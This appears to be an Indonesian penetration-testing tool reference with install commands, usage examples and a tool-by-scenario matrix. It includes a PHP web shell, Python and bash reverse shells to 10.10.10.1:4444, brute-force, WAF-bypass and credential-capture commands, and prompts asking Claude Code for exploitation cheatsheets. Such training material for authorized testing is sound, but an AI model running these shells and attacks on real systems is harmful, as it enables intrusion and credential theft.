# Daftar Tools Lengkap Penetration Testing

> Semua tools yang digunakan di seluruh 14 skenario tutorial.  
> Dikelompokkan per kategori + matriks skenario di bagian akhir.

---

## Instalasi Cepat (macOS)

```bash
# Homebrew — package manager utama
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Semua tools sekaligus
brew install nmap gobuster nikto sqlmap whatweb hydra masscan \
             subfinder amass httpx nuclei ffuf \
             gitleaks trufflehog semgrep \
             jadx apktool frida

brew install --cask burp-suite wireshark

pip3 install frida-tools objection wpscan droopescan pip-audit \
             requests pwntools impacket

gem install wpscan

# Kali Linux / Debian — sebagian besar sudah built-in
sudo apt update && sudo apt install -y \
  nmap gobuster nikto sqlmap whatweb hydra masscan \
  metasploit-framework burpsuite wireshark \
  binwalk exiftool strings
```

---

## Kategori 1: Reconnaissance & OSINT

### 1.1 DNS & Network Intelligence

| Tool | Fungsi | Skenario | Instalasi |
|------|--------|----------|-----------|
| **whois** | WHOIS lookup domain/IP | Internal, Internet | Built-in / `brew install whois` |
| **dig** | DNS query detail | Semua | Built-in |
| **nslookup** | Reverse DNS lookup | Semua | Built-in |
| **dnsrecon** | Comprehensive DNS recon | Internal, Internet | `pip install dnsrecon` |
| **subfinder** | Passive subdomain enumeration | Internet | `brew install subfinder` |
| **amass** | Active/passive subdomain enum | Internet | `brew install amass` |
| **dnsx** | DNS toolkit + brute force | Internet | `go install github.com/projectdiscovery/dnsx` |

```bash
# Contoh penggunaan
whois targetapp.co.id
dig +short A targetapp.co.id
dig +short MX targetapp.co.id
subfinder -d targetapp.co.id -o subdomains.txt
amass enum -passive -d targetapp.co.id
```

### 1.2 Web OSINT

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **Shodan CLI** | Search engine IoT/server | Internal, Internet |
| **crt.sh** | Certificate transparency log | Internet |
| **theHarvester** | Email, subdomain, dari OSINT | Internet |
| **recon-ng** | OSINT framework | Internet |
| **Waybackurls** | URL dari Wayback Machine | Internet |
| **gau** | Get All URLs dari berbagai sumber | Internet |

```bash
# Tools OSINT web
pip install theHarvester
theHarvester -d targetapp.co.id -b google,bing,linkedin

# Wayback Machine URLs
go install github.com/tomnomnom/waybackurls@latest
echo "targetapp.co.id" | waybackurls

# Get All URLs
go install github.com/lc/gau/v2/cmd/gau@latest
gau targetapp.co.id | grep "\.php\|\.asp\|\.json"
```

### 1.3 GitHub/Code Secret Scanning

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **Gitleaks** | Scan git repo untuk secrets | White Box |
| **TruffleHog** | Scan git history untuk credentials | White Box |
| **git-secrets** | Prevent secret commit | White Box |
| **truffleHog3** | Enhanced version TruffleHog | White Box |

```bash
# Secret scanning
gitleaks detect --source . --report-format json --report-path gitleaks.json

trufflehog git file://. --json > trufflehog.json

# Scan GitHub repo langsung
trufflehog github --repo https://github.com/org/repo
```

---

## Kategori 2: Scanning & Enumeration

### 2.1 Port & Network Scanning

| Tool | Fungsi | Skenario | Command Contoh |
|------|--------|----------|----------------|
| **nmap** | Port scan, service detection, script scan | **Semua** | `nmap -sV -sC -p- target` |
| **masscan** | Ultra-fast port scan | Internet | `masscan -p1-65535 target --rate=1000` |
| **rustscan** | Port scan cepat + nmap integration | Semua | `rustscan -a target -- -sV` |
| **arp-scan** | Discovery host di LAN | **Lokal** | `sudo arp-scan -l` |
| **netdiscover** | ARP discovery LAN | Lokal | `netdiscover -r 10.10.10.0/24` |

```bash
# Workflow scanning
# Step 1: Cepat (rustscan/masscan)
rustscan -a 10.10.10.5 --range 1-65535 -- -sV -sC

# Step 2: Detail dengan nmap
nmap -sV -sC -p 22,80,443,3306 10.10.10.5 \
  --script=http-headers,http-methods,ssl-cert \
  -oN scan_result.txt -oX scan_result.xml
```

### 2.2 Web Directory & File Enumeration

| Tool | Fungsi | Skenario | Kelebihan |
|------|--------|----------|-----------|
| **Gobuster** | Dir/DNS/vhost bruteforce | **Semua** | Cepat, banyak mode |
| **ffuf** | Fuzzer serbaguna (dir, param, header) | **Semua** | Sangat fleksibel |
| **feroxbuster** | Recursive dir scan | Internet | Auto-recursive |
| **dirsearch** | Directory scanner | Semua | Banyak extension |
| **wfuzz** | Web fuzzer | Semua | Param fuzzing |

```bash
# Directory scan
gobuster dir -u http://target.co.id \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,html,js,txt,bak,sql \
  -t 20 --delay 100ms -o gobuster_dirs.txt

# API endpoint fuzzing
ffuf -u https://target.co.id/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer <token>" \
  -mc 200,201,400,403,405 \
  -o api_endpoints.json -of json

# Subdomain fuzzing
ffuf -u https://FUZZ.target.co.id \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,301,302 -o subdomains_ffuf.txt
```

### 2.3 Web Application Fingerprinting

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **whatweb** | Identifikasi teknologi web | **Semua** |
| **wappalyzer** | Browser extension fingerprint | Semua |
| **httpx** | HTTP probe + teknologi detect | Internet |
| **curl** | Manual header inspection | Semua |
| **wafw00f** | WAF fingerprinting | Internet |
| **CMSmap** | CMS detection | CMS |

```bash
whatweb https://target.co.id -v --log-json=fingerprint.json
httpx -l subdomains.txt -tech-detect -status-code -title -o live_hosts.txt
wafw00f https://target.co.id
```

---

## Kategori 3: Vulnerability Scanning

### 3.1 General Vulnerability Scanners

| Tool | Fungsi | Skenario | Tipe |
|------|--------|----------|------|
| **Nuclei** | Template-based vulnerability scanner | **Semua** | Active |
| **Nikto** | Web server vulnerability scan | **Semua** | Active |
| **OpenVAS** | Network vulnerability scanner | Internal, Lokal | Active |
| **Nessus** | Enterprise vulnerability scanner | Semua | Active (Commercial) |

```bash
# Nuclei — yang paling recommended
nuclei -u https://target.co.id \
  -t nuclei-templates/ \
  -severity critical,high,medium \
  -rate-limit 10 \
  -o nuclei_results.txt

# Update templates
nuclei -update-templates

# Nikto
nikto -h https://target.co.id \
  -Tuning 123bde \
  -o nikto_results.txt -Format txt
```

### 3.2 CMS-Specific Scanners

| Tool | CMS | Skenario | Instalasi |
|------|-----|----------|-----------|
| **WPScan** | WordPress | CMS | `gem install wpscan` |
| **Joomscan** | Joomla | CMS | `apt install joomscan` |
| **Droopescan** | Drupal, SilverStripe | CMS | `pip install droopescan` |
| **CMSmap** | Multi-CMS | CMS | `git clone` |

```bash
# WordPress
wpscan --url https://target.co.id \
  --api-token YOUR_TOKEN \
  --enumerate u,vp,vt \
  -o wpscan_result.txt

# Joomla
joomscan -u https://target.co.id \
  --enumerate-components
```

### 3.3 Static Code Analysis (White Box)

| Tool | Bahasa | Skenario |
|------|--------|----------|
| **Semgrep** | Multi-bahasa (PHP, Python, JS, Java, Go) | **White Box** |
| **PHPCS Security Audit** | PHP | White Box |
| **Bandit** | Python | White Box |
| **ESLint Security** | JavaScript/TypeScript | White Box |
| **Brakeman** | Ruby on Rails | White Box |
| **CodeQL** | Multi-bahasa | White Box |
| **SonarQube** | Multi-bahasa (enterprise) | White Box |
| **Psalm** | PHP | White Box |

```bash
# Semgrep — paling versatile
semgrep --config=p/security-audit .
semgrep --config=p/owasp-top-ten .
semgrep --config=p/php . --json -o semgrep_php.json

# Bandit untuk Python
pip install bandit
bandit -r . -f json -o bandit_results.json

# PHPCS Security
composer require --dev pheromone/phpcs-security-audit
./vendor/bin/phpcs --standard=Security . --extensions=php

# Dependency audit
composer audit
npm audit --json
pip-audit -o pip_audit.json
```

---

## Kategori 4: Web Application Testing

### 4.1 HTTP Proxy & Interception

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **Burp Suite** (Community/Pro) | HTTP proxy, scanner, repeater | **Semua** |
| **OWASP ZAP** | Open source web proxy | Semua |
| **mitmproxy** | CLI HTTP proxy | Semua |

```bash
# Setup Burp Suite
# 1. Set browser proxy: 127.0.0.1:8080
# 2. Import Burp CA certificate
# 3. Target → Scope → tambahkan domain
# 4. Proxy → Intercept → aktifkan
```

### 4.2 SQL Injection

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **SQLmap** | Otomasi SQLi detection & exploitation | **Semua** |
| **BBQSQL** | Blind SQL injection | Semua |
| **NoSQLMap** | NoSQL injection (MongoDB) | SPA/API |

```bash
# SQLmap — berbagai mode
# GET parameter
sqlmap -u "https://target.co.id/search?q=1" --dbs --batch

# POST form
sqlmap -u "https://target.co.id/login" \
  --data="username=admin&password=test" \
  --dbs --batch

# Dengan WAF bypass
sqlmap -u "https://target.co.id/search?q=1" \
  --tamper=space2comment,between,randomcase \
  --random-agent --delay=2 --dbs --batch

# Via Burp request file
sqlmap -r burp_request.txt --dbs --batch
```

### 4.3 XSS Testing

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **XSSer** | XSS scanner | Semua |
| **DalFox** | XSS parameter scanner | Semua |
| **XSStrike** | Advanced XSS testing | Semua |

```bash
# DalFox — modern XSS scanner
go install github.com/hahwul/dalfox/v2@latest
dalfox url "https://target.co.id/search?q=1"
dalfox file urls.txt --output xss_results.txt

# XSStrike
python3 xsstrike.py -u "https://target.co.id/search?q=1"
```

### 4.4 Authentication Testing

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **Hydra** | Brute force login (HTTP, SSH, FTP) | **Semua** |
| **Medusa** | Parallel login brute force | Semua |
| **Burp Intruder** | Custom HTTP brute force | Semua |
| **jwt_tool** | JWT testing & attack | Grey Box, SPA |
| **hashcat** | Password hash cracking | White Box |
| **john** | Password hash cracking | White Box |

```bash
# Hydra — HTTP form brute force
hydra -L users.txt -P passwords.txt \
  http-post-form \
  "target.co.id/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 5 -w 3

# JWT tool
pip install jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -T  # tamper mode
python3 jwt_tool.py <JWT_TOKEN> -C -d wordlists/secrets.txt  # crack

# Hashcat — JWT HS256 crack
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt
```

---

## Kategori 5: Exploitation

### 5.1 Exploitation Frameworks

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **Metasploit** | Exploitation framework | Semua |
| **pwntools** | CTF & binary exploitation | CTF, Lokal |
| **Impacket** | Windows/AD exploitation | Internal, Lokal |

```bash
# Metasploit
msfconsole
msf6 > search apache 2.4.49
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 > set RHOSTS 10.10.10.5
msf6 > run
```

### 5.2 Web Shell & Reverse Shell

```bash
# Generate reverse shell payload
# PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Python reverse shell
python3 -c "import os,socket,subprocess; s=socket.socket(); s.connect(('10.10.10.1',4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(['/bin/sh','-i'])"

# Bash reverse shell
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

# Listener
nc -lvnp 4444
```

### 5.3 File Transfer & Post-Exploitation

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **linpeas** | Linux privilege escalation | Post-exploit |
| **winpeas** | Windows privilege escalation | Post-exploit |
| **PEASS-ng** | Suite privilege escalation | Post-exploit |
| **chisel** | TCP tunneling untuk pivot | Post-exploit |
| **proxychains** | Proxy untuk pivot | Post-exploit |

```bash
# Download dan run linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Setup pivot dengan chisel
# Attacker:
chisel server --reverse -p 9001
# Target:
chisel client 10.10.10.1:9001 R:socks
# Kemudian: proxychains nmap 192.168.1.0/24
```

---

## Kategori 6: Network & Protocol

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **Wireshark** | Network traffic analysis | Lokal, Internal |
| **tcpdump** | CLI packet capture | Lokal, Internal |
| **Responder** | LLMNR/NBT-NS poisoning | Lokal, Internal |
| **enum4linux** | SMB/Windows enumeration | Lokal, Internal |
| **smbclient** | SMB share access | Lokal, Internal |
| **CrackMapExec** | Windows/AD enumeration | Internal |

```bash
# Packet capture
sudo tcpdump -i eth0 host 10.10.10.5 -w traffic.pcap

# SMB enumeration
enum4linux -a 10.10.10.5
smbclient -L //10.10.10.5 -N

# Responder (MITM untuk credential capture)
sudo python3 Responder.py -I eth0 -wrf
```

---

## Kategori 7: Mobile Testing

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **apktool** | Decompile APK | Mobile |
| **jadx** | Decompile APK ke Java | Mobile |
| **MobSF** | Mobile Security Framework (static+dynamic) | Mobile |
| **Frida** | Dynamic instrumentation | Mobile |
| **Objection** | Frida-based mobile pentest toolkit | Mobile |
| **adb** | Android Debug Bridge | Mobile |
| **Drozer** | Android security assessment | Mobile |

```bash
# APK analysis
apktool d targetapp.apk -o decompiled/
jadx -d jadx_out/ targetapp.apk

# MobSF via Docker
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Frida setup
pip install frida-tools
frida -U -l ssl_bypass.js -f com.target.app

# Objection
pip install objection
objection -g com.target.app explore
# Di dalam objection:
# android sslpinning disable
# android proxy set 192.168.1.100 8080
```

---

## Kategori 8: Cloud & Infrastructure

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **AWS CLI** | AWS audit & testing | White Box Internet |
| **ScoutSuite** | Multi-cloud security audit | White Box |
| **Prowler** | AWS security audit | White Box |
| **Checkov** | IaC security scanner (Terraform) | White Box |
| **Trivy** | Container/image vulnerability scan | White Box |
| **Hadolint** | Dockerfile linter | White Box |
| **Peirates** | Kubernetes penetration testing | White Box |

```bash
# AWS audit
pip install scoutsuite
scout aws --profile pentest-profile

# IaC scanning
pip install checkov
checkov -d infrastructure/ --framework terraform

# Container scan
trivy image targetapp:latest
trivy fs . --security-checks vuln,config
```

---

## Kategori 9: Reporting Tools

| Tool | Fungsi | Skenario |
|------|--------|----------|
| **Dradis** | Collaborative pentest reporting | Semua |
| **Faraday** | Pentest management platform | Semua |
| **PlexTrac** | Report generation | Semua |
| **pandoc** | Markdown → PDF/Word | Semua |
| **VS Code** | Laporan dalam Markdown | **Semua** |

```bash
# Convert Markdown laporan ke PDF
pandoc report.md -o report.pdf --pdf-engine=wkhtmltopdf

# Atau ke Word
pandoc report.md -o report.docx
```

---

## Wordlist yang Diperlukan

| Wordlist | Isi | Digunakan Untuk |
|----------|-----|-----------------|
| `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt` | Direktori umum | gobuster dir |
| `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | Subdomain | gobuster dns, ffuf |
| `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt` | API endpoint | ffuf API |
| `/usr/share/wordlists/rockyou.txt` | Password umum | hydra, hashcat |
| `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv` | Default creds | hydra |
| Custom `indo_defaults.txt` | Default creds Indonesia | hydra |

```bash
# Install SecLists
sudo apt install seclists
# atau
git clone https://github.com/danielmiessler/SecLists /usr/share/seclists
```

---

## Matriks Tools per Skenario

| Tool | Lokal BB | Lokal GB | Lokal WB | Int BB | Int GB | Int WB | Net BB | Net GB | Net WB | CMS | SPA | E-Com | SSO | Mobile |
|------|----------|----------|----------|--------|--------|--------|--------|--------|--------|-----|-----|-------|-----|--------|
| nmap | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | – |
| gobuster | ✓ | ✓ | – | ✓ | ✓ | – | ✓ | ✓ | – | ✓ | ✓ | ✓ | – | – |
| Burp Suite | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| nikto | ✓ | – | – | ✓ | – | – | ✓ | – | – | ✓ | – | – | – | – |
| nuclei | – | – | – | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | – | – |
| sqlmap | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | – | – |
| ffuf | ✓ | ✓ | – | ✓ | ✓ | – | ✓ | ✓ | – | – | ✓ | ✓ | – | – |
| hydra | ✓ | – | – | ✓ | – | – | ✓ | – | – | ✓ | – | ✓ | – | – |
| subfinder | – | – | – | – | – | – | ✓ | ✓ | ✓ | – | – | – | – | – |
| whatweb | ✓ | ✓ | – | ✓ | ✓ | – | ✓ | ✓ | – | ✓ | ✓ | ✓ | – | – |
| semgrep | – | – | ✓ | – | – | ✓ | – | – | ✓ | – | – | – | – | – |
| gitleaks | – | – | ✓ | – | – | ✓ | – | – | ✓ | – | – | – | – | – |
| WPScan | – | – | – | – | – | – | – | – | – | ✓ | – | – | – | – |
| jwt_tool | – | ✓ | ✓ | – | ✓ | ✓ | – | ✓ | ✓ | – | ✓ | ✓ | ✓ | ✓ |
| wafw00f | – | – | – | – | – | – | ✓ | ✓ | ✓ | ✓ | – | ✓ | – | – |
| apktool/jadx | – | – | – | – | – | – | – | – | – | – | – | – | – | ✓ |
| Frida | – | – | – | – | – | – | – | – | – | – | – | – | – | ✓ |
| AWS CLI | – | – | – | – | – | – | – | – | ✓ | – | – | ✓ | – | – |
| Checkov | – | – | – | – | – | – | – | – | ✓ | – | – | – | – | – |
| Trivy | – | – | ✓ | – | – | ✓ | – | – | ✓ | – | – | – | – | – |
| Metasploit | – | – | – | ✓ | – | – | ✓ | – | – | ✓ | – | – | – | – |

*BB=Black Box, GB=Grey Box, WB=White Box, Int=Internal, Net=Internet*

---

## Prompt Claude Code untuk Tools

**Cek tools yang terinstall:**
```
Saya akan melakukan pentest [skenario]. 
Cek tools mana yang sudah terinstall dan buat skrip instalasi 
untuk yang belum ada di sistem macOS/Kali Linux:
[LIST TOOLS DARI MATRIKS YANG RELEVAN]
```

**Generate perintah lengkap:**
```
Saya akan mulai pentest [nama skenario].
Tools yang saya punya: [list tools]
Target: [target]

Buatkan command cheatsheet lengkap untuk setiap phase:
recon → scanning → testing → exploitation → reporting
dengan flag yang tepat untuk target ini.
```
